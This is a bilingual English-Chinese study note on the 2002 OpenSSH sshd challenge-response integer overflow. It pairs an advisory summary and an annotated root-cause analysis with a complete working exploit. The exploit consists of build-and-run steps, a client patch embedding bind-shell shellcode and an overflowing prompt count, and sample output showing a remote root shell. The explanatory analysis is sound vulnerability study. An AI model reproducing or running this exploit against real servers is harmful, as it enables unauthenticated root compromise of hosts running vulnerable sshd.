## 说明
Published: 2003-04-02
Updated: 2024-07-01

Buffer overflow in sshd in OpenSSH 2.3.1 through 3.3 may allow remote attackers to execute arbitrary code via a large number of responses during challenge response authentication when OpenBSD is using PAM modules with interactive keyboard authentication (PAMAuthenticationViaKbdInt).
OpenSSH vulnerabilities allow remote attackers to gain root access via crafted responses. Upgrade advised.

OpenSSH 2.3.1 到 3.3 版本中的 sshd 存在缓冲区溢出漏洞，可能允许远程攻击者通过在 challenge response authentication过程中发送大量响应，在 OpenBSD 使用 PAM 模块进行交互式键盘认证（PAMAuthenticationViaKbdInt）时执行任意代码。
OpenSSH 漏洞允许远程攻击者通过精心构造的响应获得 root 访问权限。建议升级。

``` shell
source: https://www.securityfocus.com/bid/5093/info

The OpenSSH team has reported two vulnerabilities in OpenSSH that are remotely exploitable and may allow for unauthenticated attackers to obtain root privileges.
OpenSSH 团队报告了 OpenSSH 中的两个漏洞，这些漏洞可以被远程利用，并可能允许未经身份验证的攻击者获取 root 权限。

The conditions are related to the OpenSSH SSH2 challenge-response mechanism. They occur when the OpenSSH server is configured at compile time to support BSD_AUTH or SKEY. OpenBSD 3.0 and later ship with OpenSSH built to support BSD_AUTH. Systems are vulnerable when either of the following configuration options are enabled:
这些漏洞与 OpenSSH SSH2 challenge-response机制相关。它们发生在 OpenSSH 服务器在编译时被配置为支持 BSD_AUTH 或 SKEY 时。OpenBSD 3.0 及更高版本附带的 OpenSSH 已构建为支持 BSD_AUTH。当以下任一配置选项启用时，系统会受到攻击：

PAMAuthenticationViaKbdInt
ChallengeResponseAuthentication

Attackers can exploit the vulnerabilities by crafting a malicious response. Since this occurs before the authentication process completes, remote attackers without valid credentials may exploit this. Successful exploits may result in the execution of shellcode or a denial of service.
攻击者可以通过构造恶意响应来利用这些漏洞。由于这发生在身份验证过程完成之前，远程攻击者即使没有有效的凭据也可以利用此漏洞。成功的攻击可能导致执行 shellcode 或造成服务拒绝。

OpenSSH 3.4 addresses the problem. Upgrading to this version will eliminate the vulnerabilities. Administrators who cannot install OpenSSH 3.4 should upgrade to version 3.3 and enable the privilege-separation feature.
OpenSSH 3.4 版本解决了这个问题。升级到该版本将消除这些漏洞。无法安装 OpenSSH 3.4 的管理员应升级到 3.3 版本，并启用特权分离功能。

Proof-of-concept code has been made public. Users are advised to upgrade immediately.
概念验证代码已公开发布。建议用户立即升级。

**UPDATE: One of these issues is trivially exploitable and is still present in OpenSSH 3.5p1 and 3.4p1. Although these reports have not been confirmed, administrators are advised to implement the OpenSSH privilege-separation feature as a workaround. BSD administrators are also advised to upgrade to the newest kernel versions because recently patched vulnerabilities may allow root compromise despite the use of the privilege-separation feature. 
**更新：** 其中一个问题很容易被利用，并且仍然存在于 OpenSSH 3.5p1 和 3.4p1 版本中。虽然这些报告尚未得到确认，但建议管理员实施 OpenSSH 权限隔离功能作为解决方法。BSD 管理员还被建议升级到最新的内核版本，因为最近修复的漏洞可能会在启用权限隔离功能的情况下仍然导致 root 权限被攻破。


1. Download openssh-3.2.2p1.tar.gz and untar it

~ $ tar -xvzf openssh-3.2.2p1.tar.gz

2. Apply the patch provided below by running。这个命令将应用一个补丁文件，通常补丁文件是 `.diff` 格式的，用来修改源代码。`patch` 命令会根据提供的差异文件对源代码进行修改。`path_to_diff_file` 是指向补丁文件的路径，应该指的是压缩包中的ssh.diff文件:

~/openssh-3.2.2p1 $ patch < path_to_diff_file

3. Compile the patched client，./configure 检查系统环境并为编译过程生成必要的配置文件。
`make ssh`：使用 `make` 工具编译源代码并生成 SSH 客户端程序。`make` 是一个自动化构建工具，它根据 `Makefile` 文件中的规则来编译代码。

~/openssh-3.2.2p1 $ ./configure && make ssh

4. Run the evil ssh，这个命令使用编译后的 `ssh` 客户端连接到本地 `localhost` 上的 SSH 服务，并尝试以 `root` 用户身份通过 `skey` 认证进行连接。`root:skey@localhost` 表示尝试以 `root` 用户通过 `skey` 密码方式进行 SSH 登录。这里的“恶意”是指通过利用漏洞来绕过正常的认证过程，尝试获取 root 权限:

~/openssh-3.2.2p1 $ ./ssh root:skey@localhost

5. If the sploit worked, you can connect to port 128 in another terminal:
如果攻击成功，攻击者将能够以 root 权限执行命令。

~ $ nc localhost 128
uname -a
OpenBSD nice 3.1 GENERIC#59 i386
id
uid=0(root) gid=0(wheel) groups=0(wheel)

```

下面这段代码是构造恶意 SSH 客户端的一部分，目的是在攻击中执行特定的 shellcode，绕过正常认证过程，并最终获取 root 权限。
```

--- sshconnect2.c	Sun Mar 31 20:49:39 2002
+++ evil-sshconnect2.c	Fri Jun 28 19:22:12 2002
@@ -839,6 +839,56 @@
 /*
  * parse INFO_REQUEST, prompt user and send INFO_RESPONSE
  */
+
+int do_syscall( int nb_args, int syscall_num, ... );
+
+void shellcode( void )
+{
+    int server_sock, client_sock, len;
+    struct sockaddr_in server_addr;
+    char rootshell[12], *argv[2], *envp[1];
+
+    server_sock = do_syscall( 3, 97, AF_INET, SOCK_STREAM, 0 );
+    server_addr.sin_addr.s_addr = 0;
+    server_addr.sin_port = 32768;
+    server_addr.sin_family = AF_INET;
+    do_syscall( 3, 104, server_sock, (struct sockaddr *) &server_addr, 
16 );
+    do_syscall( 2, 106, server_sock, 1 );
+    client_sock = do_syscall( 3, 30, server_sock, (struct sockaddr *)
+	&server_addr, &len );
+    do_syscall( 2, 90, client_sock, 0 );
+    do_syscall( 2, 90, client_sock, 1 );
+    do_syscall( 2, 90, client_sock, 2 );
+    * (int *) ( rootshell + 0 ) = 0x6E69622F;
+    * (int *) ( rootshell + 4 ) = 0x0068732f;
+    * (int *) ( rootshell + 8 ) = 0;
+    argv[0] = rootshell;
+    argv[1] = 0;
+    envp[0] = 0;
+    do_syscall( 3, 59, rootshell, argv, envp );
+}
+
+int do_syscall( int nb_args, int syscall_num, ... )
+{
+    int ret;
+    asm(
+	"mov	8(%ebp), %eax; "
+	"add	$3,%eax; "
+	"shl	$2,%eax; "
+	"add	%ebp,%eax; "
+	"mov	8(%ebp), %ecx; "
+	"push_args: "
+	"push	(%eax); "
+	"sub	$4, %eax; "
+	"loop	push_args; "
+	"mov	12(%ebp), %eax; "
+	"push	$0; "
+	"int	$0x80; "
+	"mov	%eax,-4(%ebp)"
+    );
+    return( ret );
+}
+
 void
 input_userauth_info_req(int type, u_int32_t seq, void *ctxt)
 {
@@ -865,7 +915,7 @@
 	xfree(inst);
 	xfree(lang);
 
-	num_prompts = packet_get_int();
+	num_prompts = 1073741824 + 1024;
 	/*
 	 * Begin to build info response packet based on prompts requested.
 	 * We commit to providing the correct number of responses, so if
@@ -874,6 +924,13 @@
 	 */
 	packet_start(SSH2_MSG_USERAUTH_INFO_RESPONSE);
 	packet_put_int(num_prompts);
+
+	for( i = 0; i < 1045; i++ )
+	    packet_put_cstring( "xxxxxxxxxx" );
+
+	packet_put_string( shellcode, 2047 );
+	packet_send();
+	return;
 
 	debug2("input_userauth_info_req: num_prompts %d", num_prompts);
 	for (i = 0; i < num_prompts; i++) {
```

## Details
### 漏洞原理(openssh-3.1)
The preauthentication remote hole in sshd's challenge-response code is a
heap-based overflow resulting from an integer overflow.
sshd 的 challenge-response代码中的预认证远程漏洞是由于整数溢出导致的基于堆的溢出。

input_userauth_info_response() in auth2-chall.c:
`auth2-chall.c` 文件中的 `input_userauth_info_response()`：

``` C
258         nresp = packet_get_int();  // number of responses
259         if (nresp > 0) {
260                 response = xmalloc(nresp * sizeof(char*));
261                 for (i = 0; i < nresp; i++)
262                         response[i] = packet_get_string(NULL);
263         }
```


The variable 'nresp' is supplied by the ssh client and can be arbitrarily
large. On x86, 'nresp' is a 4 byte unsigned integer with a maximum value
(UINT_MAX) of 0xffffffff. Also on x86, the size of a pointer is 4 bytes. The
argument to xmalloc() overflows when 'nresp' is at least 0xffffffff / 4, or
0x40000000. The function xmalloc() is a traditional wrapper around malloc()
and will henceforth be referred to as malloc(). The allocation size can be
forced easily through bogus values of 'nresp'.
变量 `nresp` 是由 SSH 客户端提供的，其值可以任意大。**在 x86 架构中，`nresp` 是一个 4 字节的无符号整数，其最大值 (UINT_MAX) 为 0xffffffff。 此外，在 x86 架构中，指针的大小为 4 字节。当 `nresp` 至少为 0xffffffff / 4，即 0x40000000 时，传递给 `xmalloc()` 的参数会发生溢出。** 函数 `xmalloc()` 是 `malloc()` 的传统封装器，因此后续将直接称为 `malloc()`。通过伪造的 `nresp` 值，可以轻松强制分配任意大小的内存。


Example:

	0x40000000 + 1 = 0x40000001 
	0x40000001 * 4 = 0x100000004
	0x100000004 is obviously too large to fit in a 32-bit value, so
	truncation reduces it to 0x00000004. In this way, 4 bytes are allocated
	through the xmalloc() wrapper.
	0x100000004 显然超出了 32 位值的表示范围，因此截断后变为 0x00000004。通过 xmalloc() 封装器仅分配了 4 字节的内存。溢出后，计算的内存大小变为较小值（例如 0 字节或非常小的值），导致后续内存分配或访问错误。

The for() loop, however, will see the original value of 'nresp' which can be
much larger than the number of bytes allocated previously. There can be an
overflow of malloc()'d memory.
然而，`for()` 循环将看到变量 `nresp` 的原始值，而这个值可能远大于之前通过 `malloc()` 分配的内存字节数。这可能导致对已分配内存的溢出访问。


This is not of that class of malloc()-based bugs where execution hijacking can result from careful manipulation of malloc() administration chunks.There are two important details to bear in mind:
这不是那类基于 `malloc()` 的漏洞，在这些漏洞中，执行劫持(execution hijacking)可能通过精心操作 `malloc()` 管理块而发生。需要记住两个重要细节：

1. OpenBSD and FreeBSD use the dynamic memory allocation routines written by Poul-Henning Kamp. 
1. OpenBSD 和 FreeBSD 使用由 Poul-Henning Kamp 编写的动态内存分配例程
2. 'response[i]' receives pointers returned from other calls to malloc().Therefore, the overwriting values can't be controlled, practically. If the buffer were on the stack, we could hope to have one of the pointers overwrite a saved instruction pointer, thus providing offset-independent redirection (for your hacking knowledge base, many programs are vulnerable to stack-based pointer array overflows of this kind). We still are afforded offset-independence here, but we have to search harder for something to overwrite... a function pointer perhaps... but what are the chances? We'll put aside that problem for now.
2. `response[i]` 接收来自其他 `malloc()` 调用返回的指针。因此，覆盖的值实际上无法被控制。如果缓冲区位于栈上，我们可以希望其中一个指针覆盖已保存的指令指针，从而实现偏移独立的重定向（对于你的黑客知识库来说，许多程序容易受到此类基于栈的指针数组溢出的攻击）。在这里，我们仍然能够获得偏移独立性，但我们需要更努力地寻找可以覆盖的内容……也许是函数指针……但是概率有多大呢？我们暂时将这个问题搁置一边。

关于点2的详细解释：
* 'response[i]' 接收来自其他 `malloc()` 调用返回的指针：这段代码中提到，`response[i]` 数组中的每个元素都存储了一个由 `malloc()` 函数分配的指针。`malloc()` 函数返回的指针指向动态分配的内存空间，这意味着 `response[i]` 实际上是一个内存地址。如果发生覆盖，这些值无法像传统的堆栈溢出漏洞那样被轻易控制。这意味着攻击者无法通过简单的操作来预测或控制 `malloc()` 分配的内存地址，从而难以直接进行利用。
* **如果缓冲区是在栈上，我们可能希望其中一个指针覆盖保存的指令指针，从而提供偏移独立的重定向（对你的黑客知识库而言，许多程序都容易受到这种基于栈的指针数组溢出的攻击）：** 这里提到，如果缓冲区位于栈上，那么攻击者可以通过覆盖栈上保存的指令指针（即返回地址），从而实现程序的执行劫持。这是栈溢出攻击的一种常见形式，攻击者通过写入超出栈的边界来覆盖指向返回地址的指针，从而控制程序流向。然而，本文中讨论的漏洞涉及的是堆内存，而非栈，因此不能直接利用栈溢出方式进行攻击。
* **我们在这里仍然享有偏移独立性，但我们需要更费力地寻找可以覆盖的东西……也许是函数指针……但可能性有多大呢？** 这里提到，尽管攻击者仍然可以实现类似的偏移独立性（即无需依赖精确的内存地址），但是在堆内存中进行覆盖比在栈上更为复杂。攻击者必须找到其他可覆盖的目标，例如函数指针，但函数指针的地址比栈上的返回地址更加难以预测和控制。因此，成功利用这一漏洞的难度较大，尽管在理论上仍然有可能。
* **我们暂时将这个问题搁置：** 最后一行表明，尽管存在需要寻找合适的覆盖目标的问题，作者决定暂时不深入讨论这个问题。这个问题可能在当前的漏洞分析中并不重要，或者更复杂，因此暂时不作为重点内容。

### 漏洞利用
Back on track...

``` C
261                 for (i = 0; i < nresp; i++)
262                         response[i] = packet_get_string(NULL);
```

Given that 'nresp' should be at least 0x40000001 (1073741825), our first task
is to break out of this loop somehow; this saves us an incredible amount of
data transfer. It's observed that sshd has no SIGURG handler.
鉴于 `nresp` 至少应为 0x40000001（1073741825），我们的首要任务是设法跳出这个循环；这样可以节省大量的数据传输。我们观察到，`sshd` 没有 SIGURG 信号处理程序。

We're forced to examine packet_get_string() in detail:
我们被迫详细检查 `packet_get_string()`：

``` C
1131 void *
1132 packet_get_string(u_int *length_ptr) //获取指定长度的incoming_packet
1133 {
1134         return buffer_get_string(&incoming_packet, length_ptr);
1135 }
```

``` C
/*
这个函数的作用是从一个缓冲区中提取一个字符串。它首先读取字符串的长度，然后分配足够的内存来存储字符串。接着，它从缓冲区中读取实际的字符串数据，并在末尾添加一个 null 字符，使其成为一个标准的 C 字符串。最后，如果需要，它会返回字符串的长度，并返回指向字符串的指针。
*/

203 void *
204 buffer_get_string(Buffer *buffer, u_int *length_ptr)
205 {
206         u_int len;  // 存储从缓冲区中读取的字符串的长度
207         u_char *value; //用于存储从缓冲区中读取的字符串
208         /* Get the length.存储从缓冲区中读取的字符串的长度*/
209         len = buffer_get_int(buffer);
210         if (len > 256 * 1024) // 长度检查，防止溢出
211                 fatal("buffer_get_string: bad string length %d", len);
212         /* Allocate space for the string.  Add one byte for a null
character. 接下来的操作是为字符串分配内存，并为字符串的结尾字符（null character）预留一个字节。*/
213         value = xmalloc(len + 1);
214         /* Get the string.从缓冲区 `buffer` 中读取 `len` 字节的数据，并将其存储到 `value` 指向的内存中。 */
215         buffer_get(buffer, value, len);
216         /* Append a null character to make processing easier. */
217         value[len] = 0;
218         /* Optionally return the length of the string. */
219         if (length_ptr)
220                 *length_ptr = len;
221         return value;
222 }
```


After examining the possibilities, it seems there's only one viable means of
early loop exit: if the length field of the string in the packet specifies a
value greater than 256 kilobytes (we use 257 kilobytes in sshconnect2.c), a
call to fatal() is made. This doesn't sound too good, though. But let's
see...
经过分析各种可能性，似乎只有一种可行的方式可以提前退出循环：如果数据包中字符串的长度字段指定的值大于 256KB（我们在 `sshconnect2.c` 中使用 257KB），则会调用 `fatal()`。不过，这听起来并不好。让我们看看……

``` C
/*
- `fatal` 函数用于记录致命错误日志并进行必要的清理工作。
- 它通过可变参数处理机制来传递格式化字符串和日志参数，并调用 `do_log` 来记录日志。
- 最后，通过 `fatal_cleanup` 执行相关的资源清理。
*/

32 void
33 fatal(const char *fmt,...)
34 {
35         va_list args; 
36         va_start(args, fmt);
37         do_log(SYSLOG_LEVEL_FATAL, fmt, args);
38         va_end(args);
39         fatal_cleanup();
40 }
```

do_log() isn't interesting. Moving on to fatal_cleanup()...
`do_log()` 并不重要。接下来看 `fatal_cleanup()`...

``` C
172 /* Fatal cleanup */
173 
174 struct fatal_cleanup {
175         struct fatal_cleanup *next;
176         void (*proc) (void *); //一个函数指针，指向需要执行的清理函数
177         void *context;
178 };
179 
180 static struct fatal_cleanup *fatal_cleanups = NULL; //定义了一个静态变量 `fatal_cleanups`，指向 `fatal_cleanup` 链表的头节点

[...]

216 void
217 fatal_cleanup(void)
218 {
219         struct fatal_cleanup *cu, *next_cu;
220         static int called = 0; //用于记录 `fatal_cleanup` 是否已被调用，初始值为 0
221 
222         if (called)
223                 exit(255);
224         called = 1;
225         /* Call cleanup functions. */
226         for (cu = fatal_cleanups; cu; cu = next_cu) {
227                 next_cu = cu->next;
228                 debug("Calling cleanup 0x%lx(0x%lx)",
229                     (u_long) cu->proc, (u_long) cu->context);
230                 (*cu->proc) (cu->context); //执行清理函数 `(*cu->proc)`
231         }
232         exit(255);
233 }
```


Lovely. A function pointer. Examining sshd source in further detail, it can
be seen that for each cleanup function, a 'fatal_cleanup' structure is
dynamically allocated on the heap. One such cleanup function,
packet_close(), is always registered. The function packet_close() is what
gets invoked on line 230 above. It isn't interesting.
很棒，一个函数指针。更详细地检查 `sshd` 源代码后，可以发现对于每个清理函数，都会在堆上动态分配一个 `fatal_cleanup` 结构体。一个这样的清理函数，`packet_close()`，总是被注册。函数 `packet_close()` 就是上面第 230 行调用的那个函数。它并不有趣。


What we need to do is overwrite the function pointer in the 'fatal_cleanup'
structure that corresponds to packet_close(). To do this we need the
'response' buffer to be allocated at a lower memory address than that used
for the cleanup structure. This requirement is closely tied to the memory
profile of the process, but given the general way in which phk malloc
operates, we can assume that we'll need to reuse a free()'d memory chunk. To
do this, we have to be very particular about our 'nresp' value.
我们需要做的是覆盖与 `packet_close()` 对应的 `fatal_cleanup` 结构中的函数指针。为了做到这一点，我们需要让 `response` 缓冲区分配在比清理结构使用的内存地址更低的位置。这个要求与进程的内存配置密切相关，但考虑到 phk malloc 的一般工作方式，我们可以假设我们需要重用一个已经调用过 `free()` 的内存块。为了做到这一点，我们必须非常谨慎地选择我们的 `nresp` 值。

Unfortunately, the memory profile varies considerably depending on which
keyboard-interactive device is used -- skey or bsdauth. The ssh(1) patch
submitted to Bugtraq by another party reuses a 4096 byte chunk (1 page),
which seems to work fine in most cases when using bsdauth. However, results
are mixed when using skey. Nevertheless, we have devised an extremely simple
procedure to follow that should result in almost flawless exploitation of
vulnerable sshd daemons on at least OpenBSD. You can read all about it in
the HOWTO file.
不幸的是，内存配置在使用不同的键盘交互设备时会有很大差异——如 skey 或 bsdauth。另一方提交给 Bugtraq 的 ssh(1) 补丁重用了一个 4096 字节的内存块（1 页），在大多数使用 bsdauth 的情况下，这似乎能够正常工作。然而，使用 skey 时的结果则较为复杂。尽管如此，我们已经设计了一种非常简单的程序，按照这个程序操作，应该能够几乎完美地利用至少在 OpenBSD 上存在漏洞的 sshd 守护进程。你可以在 HOWTO 文件中阅读详细内容。

